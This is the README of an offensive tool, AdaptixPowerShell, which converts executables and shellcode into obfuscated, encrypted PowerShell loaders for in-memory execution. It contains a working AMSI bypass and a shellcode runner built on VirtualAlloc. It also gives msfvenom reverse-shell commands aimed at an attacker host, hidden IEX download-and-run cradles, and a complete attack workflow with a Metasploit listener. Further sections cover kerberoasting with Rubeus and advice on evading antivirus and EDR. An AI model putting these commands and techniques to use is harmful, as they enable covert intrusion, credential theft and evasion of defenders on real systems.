# AdaptixPowerShell - Advanced PowerShell Payload Obfuscator

An advanced PowerShell payload generator that converts executables and shellcode into heavily obfuscated, encrypted PowerShell scripts for in-memory execution. Features Chimera-style obfuscation, XOR encryption, AMSI bypass, and direct .exe to shellcode conversion using Donut.

## Table of Contents

- [Disclaimer](#️-disclaimer)
- [Overview](#-overview)
- [Features](#-features)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Command Reference](#-command-reference)
- [Usage Examples](#-usage-examples)
- [How It Works](#-how-it-works)
- [Obfuscation Techniques](#-obfuscation-techniques)
- [Donut Integration](#-donut-integration)
- [Payload Size Guidelines](#-payload-size-guidelines)
- [Detection Evasion](#-detection-evasion)
- [Best Practices](#-best-practices)
- [Troubleshooting](#-troubleshooting)
- [FAQ](#-faq)
- [Credits](#-credits)

## ⚠️ DISCLAIMER

**THIS PROJECT IS INTENDED FOR EDUCATIONAL PURPOSES AND SECURITY RESEARCH ONLY**

This tool is designed for:
- **Security research and study**: Understanding obfuscation techniques and payload delivery mechanisms
- **Enhancing detection capabilities**: Helping blue teams and security researchers improve their detection rules and defensive strategies
- **Authorized penetration testing**: Only in controlled environments with explicit written permission

### Important Requirements:
- ✅ **MUST** be used only in controlled, isolated laboratory environments
- ✅ **MUST** have explicit written authorization before testing on any system
- ✅ **MUST NOT** be used for unauthorized access or malicious purposes
- ⚠️ Unauthorized access to computer systems is **illegal** and may result in severe legal consequences

The authors and contributors assume **NO LIABILITY** for misuse, damage, or illegal activities conducted with this tool. By using this software, you agree to use it responsibly and in accordance with all applicable laws and regulations.

---

## 📋 Overview

AdaptixPowerShell is a sophisticated payload generation framework that transforms Windows executables and raw shellcode into obfuscated PowerShell scripts designed for in-memory execution. The tool combines multiple evasion techniques to bypass modern security controls while maintaining reliability and flexibility.

### What Does It Do?

1. **Converts executables to shellcode** using Donut (position-independent code generation)
2. **Encrypts** the payload using XOR encryption with random keys
3. **Obfuscates** all code using Chimera-style techniques (variable randomization, string chunking, dead code)
4. **Bypasses AMSI** (Anti-Malware Scan Interface) using reflection
5. **Generates** ready-to-use PowerShell delivery scripts with multiple execution methods

### Why Use This Tool?

- **Bypass Static Detection**: Randomized obfuscation ensures different signatures every run
- **Evade AMSI**: Built-in AMSI bypass allows PowerShell execution in protected environments
- **In-Memory Execution**: No files written to disk (fileless attack technique)
- **Flexible Input**: Accepts both raw shellcode (.bin) and Windows executables (.exe/.dll)
- **Multiple Architectures**: Support for x86, x64, and dual-mode payloads
- **Customizable**: 5 obfuscation levels to balance stealth vs. payload size

### Use Cases

- **Red Team Operations**: Payload delivery during authorized penetration tests
- **Security Research**: Understanding obfuscation and evasion techniques
- **Blue Team Training**: Testing defensive capabilities and detection rules
- **Malware Analysis**: Studying in-memory execution techniques

---

## Features

### 🚀 NEW: EXE to Shellcode Conversion
- **Direct .exe/.dll to shellcode conversion** using [Donut](https://github.com/TheWover/donut)
- No need to manually generate raw shellcode
- Supports x86, x64, and dual-mode (x86+x64) architectures
- Built-in AMSI/WLDP bypass options
- Pass command-line parameters to the executable
- Automatic detection of PE files

### 🎭 Chimera-Style Obfuscation
- AMSI bypass string chunking
- `System.Management.Automation` string obfuscation
- `amsiInitFailed` field name obfuscation
- Random variable names (15-25 characters)
- Dead code insertion (junk code between variables)
- Random indentation
- Backtick injection in cmdlets

### 🔐 Payload Encryption & Chunking
- XOR encryption of shellcode
- Encrypted payload split into 2-5 chunks
- Random variable names for each chunk
- Runtime concatenation before decryption

### 🛡️ C# P/Invoke Obfuscation
- `kernel32.dll` split into 4 random const strings
- Random class names (replaces `Win32`)
- Random method names (replaces `VirtualAlloc`)
- Random delegate names (replaces `ShellcodeDelegate`)
- EntryPoint remapping



## Installation

```bash
git clone <repository-url>
cd hostpayload

# Install required dependencies (donut-shellcode)
pip3 install -r requirements.txt

# Make script executable
chmod +x adaptixpowerShell.py
```

**Note:** The `donut-shellcode` Python package is required for .exe to shellcode conversion. If you only plan to use raw shellcode (.bin files), you can skip installing requirements.

---

## 🚀 Quick Start

### 5-Minute Setup

```bash
# 1. Clone and setup
git clone <repository-url>
cd hostpayload
pip3 install -r requirements.txt

# 2. Generate a payload from shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 -f raw -o shell.bin
python3 adaptixpowerShell.py shell.bin -l 3

# 3. Start web server
python3 -m http.server 80

# 4. Execute on target (use the command shown in the output)
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/output.ps1')"
```

### First Payload in 30 Seconds

```bash
# Convert any .exe directly to obfuscated PowerShell
python3 adaptixpowerShell.py beacon.exe -l 3

# Output provides everything you need:
# - PowerShell file (random name)
# - Direct download command
# - Base64 encoded command
```

---

## 📖 Command Reference

### Basic Syntax

```bash
python3 adaptixpowerShell.py <input_file> [options]
```

### Required Arguments

| Argument | Type | Description |
|----------|------|-------------|
| `<input_file>` | Path | Input file (.bin shellcode or .exe/.dll executable) |

### Core Options

| Option | Short | Values | Default | Description |
|--------|-------|--------|---------|-------------|
| `--help` | `-h` | - | - | Show help message and exit |
| `--level` | `-l` | 1-5 | 3 | Obfuscation level (1=low, 5=maximum) |
| `--debug` | `-d` | - | Off | Enable debug output in generated payload |
| `--no-obfuscate` | - | - | Off | Disable all obfuscation (fast, minimal) |

### Donut Options (for .exe/.dll files)

| Option | Short | Values | Default | Description |
|--------|-------|--------|---------|-------------|
| `--arch` | `-a` | 1, 2, 3 | 3 | Target architecture:<br>1 = x86 only<br>2 = x64 only<br>3 = x86+x64 (universal) |
| `--bypass` | `-b` | 1, 2, 3 | 3 | AMSI/WLDP bypass mode:<br>1 = none<br>2 = abort on fail<br>3 = continue on fail |
| `--params` | `-p` | "string" | "" | Command line parameters for the executable |

### Obfuscation Levels Explained

| Level | Techniques Applied | Payload Size | Speed | Use Case |
|-------|-------------------|--------------|-------|----------|
| **1** | Basic string chunking, minimal obfuscation | Smallest | Fastest | Testing, low-security environments |
| **2** | + Variable randomization, some dead code | Small | Fast | Balanced approach |
| **3** | + Full Chimera obfuscation, more dead code | Medium | Moderate | **Default - Recommended** |
| **4** | + Aggressive string splitting, heavy dead code | Large | Slower | Hardened targets |
| **5** | + Maximum obfuscation, extensive dead code | Largest | Slowest | Maximum stealth required |

---

## Usage

### Basic Usage

```bash
# Generate obfuscated payload from raw shellcode (default level 3)
python3 adaptixpowerShell.py shellcode.bin

# Generate payload from .exe file (auto-converts to shellcode)
python3 adaptixpowerShell.py payload.exe -l 4

# Generate payload from .exe with command line parameters
python3 adaptixpowerShell.py payload.exe -p "arg1 arg2" -l 5

# Specify target architecture for .exe conversion
python3 adaptixpowerShell.py payload.exe --arch 2  # x64 only

# Specify obfuscation level (1-5)
python3 adaptixpowerShell.py shellcode.bin -l 4

# Enable debug mode
python3 adaptixpowerShell.py shellcode.bin -d

# Disable obfuscation
python3 adaptixpowerShell.py shellcode.bin --no-obfuscate
```

### Obfuscation Levels

- **Level 1**: Low obfuscation, faster execution
- **Level 2**: Medium obfuscation
- **Level 3**: High obfuscation (default)
- **Level 4**: Higher obfuscation
- **Level 5**: Maximum obfuscation

### Output

The script generates three delivery methods:

1. **Direct Download**:
   ```powershell
   powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/payload.ps1')"
   ```

2. **Base64 Encoded**:
   ```powershell
   powershell -nop -w hidden -enc <base64_string>
   ```

3. **PowerShell File**: `<random>.ps1`

---

## 💡 Usage Examples

### Example 1: Simple Meterpreter Payload (Recommended for Beginners)

```bash
# Use any .exe file (Cobalt Strike beacon, custom implant, etc.)
python3 adaptixpowerShell.py beacon.exe -l 4

# Start web server
python3 -m http.server 80

# Execute on target
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
```

### Example 2: Convert .exe with Command Line Parameters

```bash
# Pass parameters that will be given to the executable at runtime
python3 adaptixpowerShell.py myapp.exe -p "--config C:\temp\config.ini --verbose" -l 5

# The parameters will be passed to myapp.exe when it runs in memory
```

### Example 3: Generate Meterpreter Payload (Traditional Method)

```bash
# Generate raw shellcode with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  EXITFUNC=thread -f raw -o shell.bin

# Obfuscate with AdaptixPowerShell
python3 adaptixpowerShell.py shell.bin -l 4

# Start web server
python3 -m http.server 80

# Execute on target
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/xyz123.ps1')"
```

### Example 4: Target Specific Architecture

```bash
# Generate x64-only payload from .exe (smaller, modern systems)
python3 adaptixpowerShell.py payload.exe --arch 2 -l 4

# Generate x86-only payload from .exe (legacy systems)
python3 adaptixpowerShell.py payload.exe --arch 1 -l 4

# Generate dual-mode payload (x86+x64) - DEFAULT (maximum compatibility)
python3 adaptixpowerShell.py payload.exe --arch 3 -l 4
```

**Why choose different architectures?**
- **x64 only (--arch 2)**: 30-40% smaller payload, works on all modern Windows (recommended)
- **x86 only (--arch 1)**: Smallest payload, legacy systems only
- **Dual-mode (--arch 3)**: Maximum compatibility, but larger payload size

### Example 5: Cobalt Strike Beacon Deployment

```bash
# Convert Cobalt Strike beacon to PowerShell
python3 adaptixpowerShell.py beacon.exe --arch 2 -l 5

# Setup HTTP server
python3 -m http.server 8080

# On target machine, execute:
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/abc123.ps1')"
```

### Example 6: .NET Assembly Execution (e.g., SharpHound, Rubeus)

```bash
# Execute SharpHound with parameters
python3 adaptixpowerShell.py SharpHound.exe -p "-c All" -l 4

# Execute Rubeus with kerberoasting
python3 adaptixpowerShell.py Rubeus.exe -p "kerberoast /outfile:hashes.txt" -l 4

# The parameters will be passed to the assembly when executed in memory
```

### Example 7: Testing and Debugging

```bash
# Generate with debug output (shows decryption info)
python3 adaptixpowerShell.py test.exe -l 3 -d

# Output will include diagnostic information:
# - Encrypted payload length
# - Decryption key length
# - First 16 bytes of decrypted shellcode (hex)
# - Useful for verifying the payload works correctly
```

### Example 8: Minimum Size Payload (Fast Generation)

```bash
# Disable obfuscation for smallest/fastest payload
python3 adaptixpowerShell.py small_beacon.exe --arch 2 --no-obfuscate

# Use case: Testing, low-security environments, size constraints
```

### Example 9: Maximum Stealth (Hardened Targets)

```bash
# Maximum obfuscation with x64 architecture
python3 adaptixpowerShell.py payload.exe --arch 2 -l 5 --bypass 3

# Features enabled:
# - Level 5 obfuscation (maximum)
# - x64 only (smaller than dual-mode)
# - AMSI/WLDP bypass continues on fail
# - All Chimera-style obfuscation techniques
# - Maximum dead code insertion
```

### Example 10: Complete Attack Workflow

```bash
# Step 1: Generate meterpreter shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 EXITFUNC=thread \
  -f raw -o payload.bin

# Step 2: Obfuscate and encrypt
python3 adaptixpowerShell.py payload.bin -l 4

# Step 3: Setup listeners
# Terminal 1: Web server
python3 -m http.server 80

# Terminal 2: Metasploit listener
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST 0.0.0.0; set LPORT 443; \
  set ExitOnSession false; exploit -j"

# Step 4: Execute on target
# Use the PowerShell command from the tool's output
```



---

## 🔧 How It Works

### Complete Workflow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     INPUT PHASE                                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
        ┌─────────────────────┴─────────────────────┐
        │                                            │
    [.exe/.dll]                                 [.bin file]
        │                                            │
        ↓                                            ↓
┌──────────────────┐                          (Skip to Step 2)
│ DONUT CONVERSION │
│ - Detects PE     │
│ - Converts to PIC│
│ - Adds loader    │
└──────────────────┘
        │
        └─────────────────────┬────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 1: AMSI BYPASS INJECTION                   │
│  - Generates AMSI bypass code                                    │
│  - Uses reflection to access amsiInitFailed field                │
│  - Sets field to $true to disable AMSI                           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 2: XOR ENCRYPTION                          │
│  - Generates random 16-byte encryption key                       │
│  - XOR encrypts entire shellcode payload                         │
│  - Key embedded in PowerShell script                             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 3: PAYLOAD CHUNKING                        │
│  - Splits encrypted shellcode into 2-5 chunks                    │
│  - Each chunk assigned random variable name                      │
│  - Concatenated at runtime before decryption                     │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 4: OBFUSCATION                             │
│  - String chunking (breaks strings into pieces)                 │
│  - Variable randomization (15-25 character names)                │
│  - C# class/method name randomization                            │
│  - Backtick injection in cmdlets                                 │
│  - Random indentation                                            │
│  - Comment insertion                                             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 5: DEAD CODE INSERTION                     │
│  - Meaningless operations (never executed)                       │
│  - Junk variables and calculations                               │
│  - Scales with obfuscation level (20%-40%)                       │
│  - Hinders human analysis and pattern detection                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 6: HEADER GENERATION                       │
│  - Adds fake Microsoft PowerShell header                         │
│  - Random script name and metadata                               │
│  - Appears legitimate to cursory inspection                      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                     OUTPUT: .ps1 FILE                            │
│  - Ready-to-use PowerShell script                                │
│  - Direct download command                                       │
│  - Base64 encoded command                                        │
└─────────────────────────────────────────────────────────────────┘
```

### Runtime Execution Flow (On Target)

```
┌─────────────────────────────────────────────────────────────────┐
│              POWERSHELL DOWNLOADS & EXECUTES SCRIPT              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 1: AMSI BYPASS                             │
│  PowerShell reflection disables AMSI monitoring                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 2: CHUNK CONCATENATION                     │
│  5 encrypted chunks → Single byte array                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 3: XOR DECRYPTION                          │
│  Decrypts shellcode using embedded key                           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 4: MEMORY ALLOCATION                       │
│  VirtualAlloc(): Allocate RWX memory region                      │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 5: SHELLCODE COPY                          │
│  Marshal.Copy(): Copy decrypted shellcode to memory              │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                  STEP 6: EXECUTION                               │
│  GetDelegateForFunctionPointer(): Create delegate & invoke       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│              SHELLCODE EXECUTES IN MEMORY                        │
│  - No files written to disk                                      │
│  - Runs with PowerShell process privileges                       │
│  - Original .exe/.dll behavior maintained                        │
└─────────────────────────────────────────────────────────────────┘
```

### Technical Details

#### 1. Donut Conversion (for .exe files)

Donut creates position-independent code (PIC) from executables:
- Parses PE headers and extracts necessary metadata
- Creates a loader stub that reconstructs the PE in memory
- Resolves imports and relocations dynamically
- Supports .NET assemblies (uses CLR hosting)
- Supports native executables (custom PE loader)

**Size Impact:** 1.7 MB .exe → ~1.7 MB shellcode (minimal overhead)

#### 2. XOR Encryption

- **Algorithm:** Simple XOR cipher with random key
- **Key Length:** 16 bytes (randomly generated each run)
- **Why XOR?** Fast, reversible, different output every time
- **Key Storage:** Embedded in PowerShell script (obfuscated)

```python
encrypted_byte = original_byte XOR key[i % key_length]
```

#### 3. AMSI Bypass Technique

Uses PowerShell reflection to disable AMSI:

```powershell
$ref = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$field = $ref.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
```

**Result:** AMSI reports "not initialized" for all subsequent scans

#### 4. Memory Injection Method

Uses **Adaptix C2 technique** (GetDelegateForFunctionPointer):

```powershell
# Allocate RWX memory
$ptr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

# Copy shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $size)

# Create delegate and execute
$delegate = [Marshal]::GetDelegateForFunctionPointer($ptr, [ShellcodeDelegate])
$delegate.Invoke()
```

**Advantages:**
- No external DLL injection
- Runs in PowerShell process context
- Minimal API calls (harder to detect)

## Donut Integration

This tool integrates [Donut](https://github.com/TheWover/donut) - a shellcode generation tool that creates position-independent shellcode payloads from .NET Assemblies, native EXEs/DLLs, VBS/JS/XSL scripts.

### What is Donut?

Donut is a shellcode generation tool that allows you to convert executables into shellcode that can be executed from memory. It:

- Generates position-independent shellcode from EXE/DLL files
- Supports both .NET assemblies and native PE files
- Includes built-in AMSI and WLDP bypass capabilities
- Allows passing command-line parameters to the executable
- Works on x86, x64, and dual-mode architectures

### Donut Options

| Option | Values | Description |
|--------|--------|-------------|
| `-a, --arch` | 1=x86, 2=amd64, 3=x86+amd64 | Target architecture (default: 3) |
| `-b, --bypass` | 1=none, 2=abort, 3=continue | AMSI/WLDP bypass behavior (default: 3) |
| `-p, --params` | string | Command line parameters for the executable |

### Example Use Cases

1. **Cobalt Strike Beacon**: Convert beacon.exe to shellcode
2. **Custom C# Tools**: Execute .NET assemblies in memory
3. **Mimikatz**: Run mimikatz.exe without touching disk
4. **Any Windows PE**: Convert any .exe to injectable shellcode

---

## 📏 Payload Size Guidelines

### Understanding Size Inflation

PowerShell hex encoding causes significant size inflation:

```
Binary Shellcode:  \x41\x42\x43     (3 bytes)
PowerShell Array:  0x41,0x42,0x43   (15 characters)
                   
Size Multiplier: ~5x inflation
```

### Size Limits by Input

| Input Type | Input Size | Donut Shellcode | Final Payload | Status |
|------------|-----------|-----------------|---------------|---------|
| Raw shellcode | 10 KB | - | ~50 KB | ✅ Excellent |
| Raw shellcode | 50 KB | - | ~250 KB | ✅ Great |
| Small .exe | 100 KB | 115 KB | ~575 KB | ✅ Good |
| Medium .exe | 500 KB | 520 KB | ~2.6 MB | ✅ Works |
| Large .exe | 1 MB | 1 MB | ~5 MB | ⚠️ Marginal |
| **Very Large .exe** | **1.7 MB** | **1.7 MB** | **~8.5 MB** | **❌ Problematic** |

### Reliability Guide

| Final Payload Size | Execution Success Rate | Recommendation |
|-------------------|----------------------|-----------------|
| < 500 KB | 99%+ | ✅ **Optimal** - Recommended |
| 500 KB - 2 MB | 95%+ | ✅ **Good** - Reliable |
| 2 MB - 5 MB | 85%+ | ⚠️ **Marginal** - Test thoroughly |
| 5 MB - 10 MB | 60%+ | ❌ **Problematic** - Often fails |
| > 10 MB | < 30% | ❌ **Won't Work** - Too large |

### Why Large Payloads Fail

1. **Memory Allocation**: PowerShell has practical memory limits
2. **Download Timeouts**: Large scripts timeout during download
3. **Parsing Overhead**: PowerShell struggles with massive hex arrays
4. **EDR Detection**: Large memory allocations trigger behavioral alerts
5. **Network Constraints**: Firewall/proxy size limits

### Optimization Strategies

#### For Raw Shellcode

```bash
# Already optimal - shellcode is pre-compiled
python3 adaptixpowerShell.py meterpreter.bin -l 3
```

#### For Small Executables (< 500 KB)

```bash
# Use default settings - works great
python3 adaptixpowerShell.py small_beacon.exe -l 3
```

#### For Medium Executables (500 KB - 1 MB)

```bash
# Use x64 only + moderate obfuscation
python3 adaptixpowerShell.py medium.exe --arch 2 -l 2
```

#### For Large Executables (> 1 MB)

```bash
# Option 1: Minimum settings (may still fail)
python3 adaptixpowerShell.py large.exe --arch 2 -l 1

# Option 2: Generate shellcode with msfvenom instead (BETTER)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 -f raw -o shell.bin
python3 adaptixpowerShell.py shell.bin -l 3
```

### Best Practices for Size Management

1. ✅ **Use purpose-built payloads** instead of full applications
2. ✅ **Generate shellcode directly** when possible (msfvenom, Cobalt Strike)
3. ✅ **Target specific architecture** (--arch 2 for x64)
4. ✅ **Test payload size** before deployment (ls -lh *.ps1)
5. ✅ **Use lower obfuscation** for large files (-l 1 or -l 2)
6. ❌ **Don't convert GUI applications** (putty.exe, notepad++.exe)
7. ❌ **Don't convert installers** or setup files
8. ❌ **Don't use level 5** obfuscation on large files

---

## 🛡️ Best Practices

### Operational Security

1. **Always Use HTTPS**
   ```bash
   # Setup HTTPS server instead of HTTP
   python3 -m http.server 443 --ssl
   ```

2. **Randomize Infrastructure**
   - Different IP addresses per operation
   - Rotate domains/subdomains
   - Use cloud providers for hosting

3. **Clean Up After Operations**
   ```bash
   # Remove generated payloads after use
   rm -f *.ps1
   ```

4. **Test in Isolated Environment First**
   - VM/sandbox testing before deployment
   - Verify payload works correctly
   - Check payload size is reasonable

### Payload Generation Best Practices

1. **Choose Appropriate Obfuscation Level**
   - Level 3 for most operations (balanced)
   - Level 5 for hardened targets only
   - Level 1-2 for size-constrained scenarios

2. **Match Architecture to Target**
   - Use `--arch 2` (x64) for modern Windows
   - Use `--arch 3` only when target unknown
   - Smaller payload = better reliability

3. **Test Command Line Parameters**
   ```bash
   # Verify parameters work before deployment
   python3 adaptixpowerShell.py tool.exe -p "test params" -l 3 -d
   ```

4. **Monitor Payload Size**
   ```bash
   # Always check size after generation
   ls -lh *.ps1
   # If > 5 MB, reconsider approach
   ```

### Execution Best Practices

1. **Use Appropriate Execution Method**
   - Direct download for testing
   - Base64 encoded for stealth
   - Consider alternative delivery (macro, HTA, etc.)

2. **Timing Considerations**
   - Execute during business hours (blend in)
   - Avoid automated scans/AV update times
   - Stagger executions across targets

3. **Error Handling**
   - Use debug mode (-d) during testing
   - Monitor for AMSI bypass failures
   - Have fallback payloads ready

### Detection Avoidance

1. **Vary Your Payloads**
   - Regenerate for each target
   - Different obfuscation levels
   - Unique infrastructure per operation

2. **Avoid Patterns**
   - Don't reuse same payload
   - Change parameters between runs
   - Rotate delivery methods

3. **Monitor for Detection**
   - Watch for blocked connections
   - Check AV/EDR alerts
   - Adjust tactics if detected

## Obfuscation Techniques

### String Chunking
```powershell
# Before
$dll = "kernel32.dll"

# After
$vKudKDAuMJHv = "ker"
$DOOqHAdQjVXYBFc = "nel"
$knbATApFWUpN = "32."
$hNverCTTZdykJ = "dll"
$dll = $vKudKDAuMJHv + $DOOqHAdQjVXYBFc + $knbATApFWUpN + $hNverCTTZdykJ
```

### Payload Chunking
```powershell
[Byte[]] $chunk1 = 0x62,0xBE,0x41,0xB7...
[Byte[]] $chunk2 = 0xF7,0xF5,0xBB,0x2D...
[Byte[]] $chunk3 = 0x4D,0x90,0xF7,0x58...
[Byte[]] $encrypted = $chunk1 + $chunk2 + $chunk3
```

### Dead Code Insertion (Anti-Human Analysis)
```powershell
# Real code mixed with junk code
$realVariable = "important"
Get-Random -Min 1 -Max 100 | Out-Null  # Dead code (unused)
$junkVar = 'randomString'              # Dead code (unused)
[Math]::Abs(-500) | Out-Null           # Dead code (unused)
$anotherReal = "value"
if ($undefined -eq $null) { $x = 5 }   # Dead code (never executes)
$env:COMPUTERNAME | Out-Null           # Dead code (unused)
```

**10 Types of Dead Code:**
1. Meaningless variable assignments
2. Math operations with unused results  
3. Conditionals that never execute
4. String operations with unused results
5. Environment variable checks (unused)
6. Timestamp operations (unused)
7. Random number generation (unused)
8. Type checks (unused)
9. Process checks (unused)
10. Commented debugging code

**Important Notes:**
- Dead code is intelligently inserted between PowerShell lines
- Scales with obfuscation level (20% at level 1, up to 40% at level 5)
- Zero performance impact - all junk piped to `Out-Null` or never executes
- Makes manual analysis harder for security researchers

### C# Class Obfuscation
```csharp
// Before
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(...);
}

// After
private const string vKudKDAuMJHv = "ker";
private const string DOOqHAdQjVXYBFc = "nel";
private const string knbATApFWUpN = "32.";
private const string hNverCTTZdykJ = "dll";

public class UwZtTEjJflziJLL {
    [DllImport(vKudKDAuMJHv + DOOqHAdQjVXYBFc + knbATApFWUpN + hNverCTTZdykJ, EntryPoint = "VirtualAlloc")]
    public static extern IntPtr nTUEhCagiLrPlou(...);
}
```

## Detection Evasion

### ✅ Bypassed/Obfuscated
- Static signature detection
- String-based AV signatures
- Hash-based detection (different each run)
- AMSI (bypassed)
- Simple obfuscation detection

### ⚠️ Still Detectable
- Behavioral analysis (memory allocation patterns)
- Advanced EDR with behavioral heuristics
- Network-based IDS/IPS (for download cradles)
- ETW (Event Tracing for Windows)

## Testing

Always test your payloads in a controlled environment:

```bash
# Create test shellcode (NOP sled)
python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 8)" > test.bin

# Generate payload
python3 adaptixpowerShell.py test.bin -l 3 -d

# Test execution (should not crash)
powershell -ExecutionPolicy Bypass -File generated_payload.ps1
```

## Troubleshooting

### Large Executable Files (IMPORTANT!)

**⚠️ Payload Size Limitations:**

Large executables (> 1 MB) may produce PowerShell payloads that are too large to execute reliably:

| Executable Size | Payload Size | Status |
|----------------|--------------|---------|
| < 100 KB | ~500 KB | ✅ Reliable |
| 100-500 KB | 1-3 MB | ✅ Good |
| 500 KB - 1 MB | 3-5 MB | ⚠️ Marginal |
| 1+ MB (e.g., putty.exe) | 8+ MB | ❌ Problematic |

**Problem:** PowerShell hex encoding inflates shellcode size by ~5x, causing:
- Memory allocation failures
- Download timeouts
- Execution hangs/crashes
- EDR/AV detection

**Solutions for large executables:**

1. **Use smaller alternatives** (BEST)
   ```bash
   # Don't convert full GUI apps
   # Use purpose-built payloads/beacons instead
   ```

2. **Use msfvenom shellcode** instead
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=192.168.1.100 LPORT=443 -f raw -o shell.bin
   python3 adaptixpowerShell.py shell.bin -l 3
   # Result: ~300 KB payload vs 8+ MB
   ```

3. **Reduce settings**
   ```bash
   # x64 only + minimal obfuscation
   python3 adaptixpowerShell.py large.exe --arch 2 -l 1
   ```

### Common Issues and Solutions

#### Issue: "Payload doesn't execute on target"

**Possible Causes:**
1. AMSI bypass failed
2. PowerShell execution policy blocking
3. Payload too large
4. Network/download issues

**Solutions:**
```bash
# 1. Try with debug mode to see what's happening
python3 adaptixpowerShell.py payload.exe -l 3 -d

# 2. Test on similar VM first

# 3. Try different bypass mode
python3 adaptixpowerShell.py payload.exe -l 3 --bypass 2

# 4. Reduce payload size
python3 adaptixpowerShell.py payload.exe --arch 2 -l 1
```

#### Issue: "Payload gets detected by AV"

**Solutions:**
```bash
# 1. Increase obfuscation level
python3 adaptixpowerShell.py payload.exe -l 5

# 2. Regenerate payload (different each time)
python3 adaptixpowerShell.py payload.exe -l 4

# 3. Use raw shellcode instead of .exe
msfvenom ... -f raw -o shell.bin
python3 adaptixpowerShell.py shell.bin -l 4
```

#### Issue: "Download command doesn't work"

**Checklist:**
- ✅ Web server running? (`python3 -m http.server 80`)
- ✅ Firewall allows connections?
- ✅ Correct IP address in command?
- ✅ Payload file exists in web root?
- ✅ Target can reach attacker IP?

---

## ❓ FAQ

### General Questions

**Q: Is this tool legal to use?**  
A: Yes, for authorized security testing, research, and educational purposes only. Always obtain written permission before testing on any systems you don't own.

**Q: Will this bypass all antivirus?**  
A: No tool bypasses all detection. This tool helps evade static signatures and AMSI, but behavioral analysis and advanced EDR may still detect it.

**Q: Can I use this in production red team operations?**  
A: Yes, but always follow your rules of engagement and ensure proper authorization.

**Q: Is the shellcode encrypted on disk?**  
A: Yes, the shellcode is XOR encrypted in the .ps1 file. It's only decrypted in memory at runtime.

### Technical Questions

**Q: Why do I need the donut module?**  
A: Donut converts .exe files to position-independent shellcode. Without it, you can only use raw .bin shellcode files.

**Q: What's the difference between the obfuscation levels?**  
A: Higher levels add more obfuscation techniques but increase payload size and generation time. Level 3 is recommended for most scenarios.

**Q: Can I use this with Cobalt Strike beacons?**  
A: Yes! Convert your beacon.exe directly:
```bash
python3 adaptixpowerShell.py beacon.exe --arch 2 -l 4
```

**Q: Does this work on PowerShell 7?**  
A: It's designed for Windows PowerShell (5.1). PowerShell Core (7+) has different behavior and may not work reliably.

**Q: Can I chain this with other tools?**  
A: Yes! Generate shellcode with any tool (msfvenom, Cobalt Strike, custom tools) and convert it:
```bash
# Any tool that outputs raw shellcode
your-tool --output shell.bin
python3 adaptixpowerShell.py shell.bin -l 3
```

### Payload Questions

**Q: Why is my payload so large?**  
A: PowerShell hex encoding inflates size by ~5x. Large input files (> 1 MB) create very large payloads. See [Payload Size Guidelines](#-payload-size-guidelines).

**Q: Can I compress the payload?**  
A: The tool doesn't include compression, but you can:
- Use smaller input files
- Lower obfuscation level
- Target specific architecture (--arch 2)

**Q: How do I pass command-line arguments to the exe?**  
A: Use the `-p` or `--params` option:
```bash
python3 adaptixpowerShell.py tool.exe -p "arg1 arg2 --flag" -l 3
```

**Q: Can I convert DLL files?**  
A: Yes, donut supports DLLs. Specify the export function if needed.

### Execution Questions

**Q: Do I need admin rights to run the payload?**  
A: No, the payload runs with the privileges of the PowerShell process. If PowerShell is running as admin, the payload has admin rights.

**Q: What if AMSI bypass fails?**  
A: Use `--bypass 2` (abort on fail) instead of default `--bypass 3` (continue on fail). This prevents execution if AMSI can't be bypassed.

**Q: Can I execute the payload without downloading?**  
A: Yes, you can embed the entire .ps1 content in a command or macro, but it will be very long for large payloads.

